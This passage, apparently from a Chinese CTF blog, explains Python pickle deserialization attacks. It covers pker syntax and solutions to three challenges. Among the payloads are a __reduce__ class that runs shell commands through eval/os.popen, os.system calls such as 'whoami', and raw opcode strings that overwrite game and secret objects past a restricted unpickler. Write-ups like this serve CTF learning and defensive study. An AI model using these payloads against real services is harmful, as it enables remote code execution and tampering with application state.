<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">以下module都可以是包含`.`的子module</span><br><span class="line">调用函数时，注意传入的参数类型要和示例一致</span><br><span class="line">对应的opcode会被生成，但并不与pker代码相互等价</span><br><span class="line"></span><br><span class="line">GLOBAL</span><br><span class="line">对应opcode：<span class="string">b&#x27;c&#x27;</span></span><br><span class="line">获取module下的一个全局对象（没有<span class="keyword">import</span>的也可以，比如下面的os）：</span><br><span class="line">GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">输入：module,instance(<span class="built_in">callable</span>、module都是instance)  </span><br><span class="line"></span><br><span class="line">INST</span><br><span class="line">对应opcode：<span class="string">b&#x27;i&#x27;</span></span><br><span class="line">建立并入栈一个对象（可以执行一个函数）：</span><br><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>)  </span><br><span class="line">输入：module,<span class="built_in">callable</span>,para </span><br><span class="line"></span><br><span class="line">OBJ</span><br><span class="line">对应opcode：<span class="string">b&#x27;o&#x27;</span></span><br><span class="line">建立并入栈一个对象（传入的第一个参数为<span class="built_in">callable</span>，可以执行一个函数））：</span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;ls&#x27;</span>) </span><br><span class="line">输入：<span class="built_in">callable</span>,para</span><br><span class="line"></span><br><span class="line">xxx(xx,...)</span><br><span class="line">对应opcode：<span class="string">b&#x27;R&#x27;</span></span><br><span class="line">使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）</span><br><span class="line"></span><br><span class="line">li[<span class="number">0</span>]=<span class="number">321</span></span><br><span class="line">或</span><br><span class="line">globals_dic[<span class="string">&#x27;local_var&#x27;</span>]=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">对应opcode：<span class="string">b&#x27;s&#x27;</span></span><br><span class="line">更新列表或字典的某项的值</span><br><span class="line"></span><br><span class="line">xx.attr=<span class="number">123</span></span><br><span class="line">对应opcode：<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">对xx对象进行属性设置</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">对应opcode：<span class="string">b&#x27;0&#x27;</span></span><br><span class="line">出栈（作为pickle.loads函数的返回值）：</span><br><span class="line"><span class="keyword">return</span> xxx <span class="comment"># 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为 <strong>左值</strong> ，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符， <strong>作为右值是可以的</strong> 。即“查值不行，赋值可以”。</li>
<li>pker解析<code>S</code>时，用<strong>单引号</strong>包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li>
</ol>
<h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul>
<li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret=GLOBAL(&#x27;__main__&#x27;, &#x27;secret&#x27;) </span><br><span class="line"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="line">secret.name=&#x27;1&#x27;</span><br><span class="line">secret.category=&#x27;2&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>覆盖引入模块的变量：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">game = GLOBAL(&#x27;guess_game&#x27;, &#x27;game&#x27;)</span><br><span class="line">game.curr_ticket = &#x27;123&#x27;</span><br></pre></td></tr></table></figure>

<p>接下来会给出一些具体的基本操作的实例。</p>
<h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul>
<li>通过<code>b&#39;R&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;whoami&#x27;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s) # `b&#x27;R&#x27;`调用</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;i&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>多参数调用函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INST(&#x27;[module]&#x27;, &#x27;[callable]&#x27;[, par0,par1...])</span><br><span class="line">OBJ(GLOBAL(&#x27;[module]&#x27;, &#x27;[callable]&#x27;)[, par0,par1...])</span><br></pre></td></tr></table></figure>

<h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul>
<li>实例化对象是一种特殊的函数执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">animal = INST(&#x27;__main__&#x27;, &#x27;Animal&#x27;,&#x27;1&#x27;,&#x27;2&#x27;)</span><br><span class="line">return animal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line"></span><br><span class="line">animal = OBJ(GLOBAL(&#x27;__main__&#x27;, &#x27;Animal&#x27;), &#x27;1&#x27;,&#x27;2&#x27;)</span><br><span class="line">return animal</span><br></pre></td></tr></table></figure>

<ul>
<li>其中，python原文件中包含：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Animal:</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, category):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以先实例化再赋值：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">animal = INST(&#x27;__main__&#x27;, &#x27;Animal&#x27;)</span><br><span class="line">animal.name=&#x27;1&#x27;</span><br><span class="line">animal.category=&#x27;2&#x27;</span><br><span class="line">return animal</span><br></pre></td></tr></table></figure>

<h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul>
<li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li>
<li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li>
</ul>
<h1 id="几道例题"><a href="#几道例题" class="headerlink" title="几道例题"></a>几道例题</h1><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><blockquote>
<p><strong>reduce</strong></p>
</blockquote>
<p>前面的jwt爆破和逻辑漏洞略过</p>
<p>admin.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>19行pickle.loads</p>
<p>对传入的become参数url解码之后反序列化加载</p>
<p>构造一个恶意类传入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))  <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line"></span><br><span class="line">poc = pickle.dumps(evil())</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(poc))  <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></span><br></pre></td></tr></table></figure>


<h2 id="SUCTF2019-GuessGame"><a href="#SUCTF2019-GuessGame" class="headerlink" title="SUCTF2019-GuessGame"></a>SUCTF2019-GuessGame</h2><blockquote>
<p>全局变量覆盖</p>
</blockquote>
<p>下载附件源码</p>
<p>因为现在是复现，但是<strong>真正比赛的时候</strong>拿到这个源码应该怎么处理，要正视这个问题</p>
<p>首先肯定得把它的核心逻辑都详细过一遍</p>
<p>banner中说这是个猜数字游戏，必须每轮都赢</p>
<p>应该是拿client和server交互来拿到flag</p>
<p>game_client.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">start_client</span>(<span class="params">host, port</span>):</span><br><span class="line">    reader, writer = <span class="keyword">await</span> asyncio.open_connection(host, port)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#猜10次</span></span><br><span class="line">        number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> number == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                number = <span class="built_in">input</span>(<span class="string">&#x27;Input the number you guess\n&gt; &#x27;</span>)</span><br><span class="line">                number = <span class="built_in">int</span>(number)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#将number封装到ticket中，序列化ticket对象</span></span><br><span class="line">        ticket = Ticket(number)</span><br><span class="line">        ticket = pickle.dumps(ticket)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#先写入长度然后写入数据</span></span><br><span class="line">        writer.write(pack_length(<span class="built_in">len</span>(ticket)))</span><br><span class="line">        writer.write(ticket)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">        response = <span class="keyword">await</span> reader.readline()</span><br><span class="line">        <span class="built_in">print</span>(response.decode())</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> reader.readline()</span><br><span class="line">    <span class="built_in">print</span>(response.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, number</span>):</span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="comment">#两个对象比较运算，如果他们都是ticket且number属性一样返回true</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(self) == <span class="built_in">type</span>(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#要求number属性一定要是int</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">type</span>(self.number) == <span class="built_in">int</span></span><br><span class="line">        <span class="comment">#且number再范围内</span></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>


<p>server</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">        length = stdin_read(<span class="number">4</span>)</span><br><span class="line">        length, = read_length(length)</span><br><span class="line">        <span class="comment">#读取长度</span></span><br><span class="line">        ticket = stdin_read(length)</span><br><span class="line">        <span class="comment">#按照长度读取序列化后的ticket数据</span></span><br><span class="line">        ticket = restricted_loads(ticket)</span><br><span class="line">        <span class="comment">#反序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">type</span>(ticket) == Ticket</span><br><span class="line">        <span class="comment">#判断反序列化后的ticket是不是ticket对象</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">            <span class="comment">#is_valid判断</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;The number is invalid.&#x27;</span>)</span><br><span class="line">            game.next_game(Ticket(-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">        win = game.next_game(ticket)</span><br><span class="line">        <span class="keyword">if</span> win:</span><br><span class="line">            text = <span class="string">&quot;Congratulations, you get the right number!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;Wrong number, better luck next time.&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.is_win():</span><br><span class="line">        text = <span class="string">&quot;Game over! You win all the rounds, here is your flag %s&quot;</span> % get_flag()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;Game over! You got %d/%d.&quot;</span> % (game.win_count, game.round_count)</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Houston, we got a problem.&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>看下game类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#number是随机整数</span></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        <span class="comment">#封装到一个ticket对象中，然后初始化round值</span></span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count = <span class="number">0</span></span><br><span class="line">        self.win_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_game</span>(<span class="params">self, ticket</span>):</span><br><span class="line">        <span class="comment">#一把判断</span></span><br><span class="line">        win = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> self.curr_ticket == ticket:</span><br><span class="line">            <span class="comment">#比较两个ticket</span></span><br><span class="line">            self.win_count += <span class="number">1</span></span><br><span class="line">            win = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        number = randint(<span class="number">0</span>, number_range)</span><br><span class="line">        <span class="comment">#重新生成随机数</span></span><br><span class="line">        self.curr_ticket = Ticket(number)</span><br><span class="line">        self.round_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> win</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">finished</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#大于等于10次的时候结束</span></span><br><span class="line">        <span class="keyword">return</span> self.round_count &gt;= max_round</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_win</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#赢得轮数等于10次的时候结束</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>游戏的逻辑很简单，一共10轮猜数字得都赢才能拿到flag</p>
<p>我想到的思路：</p>
<p>1.控制传过去的数和要比较的数相等，因为game类实例化是在反序列化之前所以有可能可以控制</p>
<p>2.变更游戏获胜条件，这点可以用反序列化变更全局属性达到</p>
<p>3.有没有办法导入其他库直接读取flag</p>
<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exp = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I9</span></span><br><span class="line"><span class="string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>1-2行获取到game这个类</p>
<p>3-6行修改属性</p>
<p>7用s输入键值对，c获取到类，b修改属性，栈顶传入ticket对象，因为他服务端要判断是否传入ticket对象</p>
<blockquote>
<p>构造出 pickle 代码获得 guess_game.game, 然后修改 game 的 win_count 和 round_count 即可.<br />注意这里必须手写, 如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取.</p>
</blockquote>
<p>因为他这里限制了只能用它自己的模块，所以只能用字节码来打</p>
<h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>构造恶意类覆盖</p>
<p>RestrictedUnpickler.py 里重写了 find_class，对反序列化的对象位置进行了限制，只允许 guess_game 下的模块，而且不允许含 __ 的内置对象。</p>
<p>那么可以先反序列化一个 guess_game里的game对象，然后再反序列化一个 guess_game.Ticket里的Ticket类，参数 number 随便赋一个值（比如6），然后将 Ticket 赋值给 game的curr_ticket <strong>覆盖服务端随机生成的 Ticket</strong>，最后我们再反序列化一次最开始反序列化的 Ticket，参数 number 赋相同值。</p>
<p>将以上反序列化过程，对照 pickle 源代码构造好一条语句，直接循环10次打过去，就能拿到flag。</p>
<p>构造好的 payload：</p>
<p>ticket &#x3D; b”\x80\x04cguess_game\ngame\nN(S’curr_ticket’\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sbd\x86bcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.”</p>
<h3 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h3><p>如果用pker里官方带的示例构造极为简单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Game = GLOBAL(<span class="string">&#x27;guess_game.Game&#x27;</span>, <span class="string">&#x27;Game&#x27;</span>)</span><br><span class="line">game = GLOBAL(<span class="string">&#x27;guess_game&#x27;</span>, <span class="string">&#x27;game&#x27;</span>)</span><br><span class="line">game.round_count = <span class="number">10</span></span><br><span class="line">game.win_count = <span class="number">10</span></span><br><span class="line">ticket = INST(<span class="string">&#x27;guess_game.Ticket&#x27;</span>, <span class="string">&#x27;Ticket&#x27;</span>, <span class="number">6</span>)</span><br><span class="line"><span class="keyword">return</span> ticket</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ticket = INST(<span class="string">&#x27;guess_game.Ticket&#x27;</span>, <span class="string">&#x27;Ticket&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">game = GLOBAL(<span class="string">&#x27;guess_game&#x27;</span>, <span class="string">&#x27;game&#x27;</span>)</span><br><span class="line">game.curr_ticket = ticket</span><br><span class="line"><span class="keyword">return</span> ticket</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ticket=INST(<span class="string">&#x27;guess_game.Ticket&#x27;</span>,<span class="string">&#x27;Ticket&#x27;</span>,(<span class="number">1</span>))</span><br><span class="line">game=GLOBAL(<span class="string">&#x27;guess_game&#x27;</span>,<span class="string">&#x27;game&#x27;</span>)</span><br><span class="line">game.win_count=<span class="number">9</span></span><br><span class="line">game.round_count=<span class="number">9</span></span><br><span class="line">game.curr_ticket=ticket</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ticket</span><br></pre></td></tr></table></figure>

<h2 id="高校战“疫”-webtmp"><a href="#高校战“疫”-webtmp" class="headerlink" title="[高校战“疫”]webtmp"></a>[高校战“疫”]webtmp</h2><blockquote>
<p>变量覆盖</p>
<p>过滤了R，限制模块为__main__</p>
</blockquote>
<p>部分源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name&#125;</span>, category=<span class="subst">&#123;self.category&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	    <span class="comment">#限制模块</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">		<span class="comment">#过滤R</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">	    <span class="comment">#判断</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;result=&#123;&#125;\npickle_data=&#123;&#125;\ngiveflag=&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(result, pickle_data, correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something wrong&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>覆盖main下的secret，覆盖原来import的secret</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;category&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>c先引入__main__.sercret,在栈中第一个元素位置.</p>
<p>(压入mark.</p>
<p>S依次压入name,1,category,2</p>
<p>d组成字典{‘name’:’1’,category’:2},且mark,name,1,category,2出栈,字典入栈.</p>
<p>b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 . 在这里就是操作secret.name和secret.category.(栈上第一个元素出栈</p>
<p>构造Animal对象：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">o.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


<p>然后两个拼接即可. 因为要将Animal对象返回,所以赋值留下的一个<strong>元素需要pop掉(0)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;category&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">db0(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">o.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br><span class="line"><span 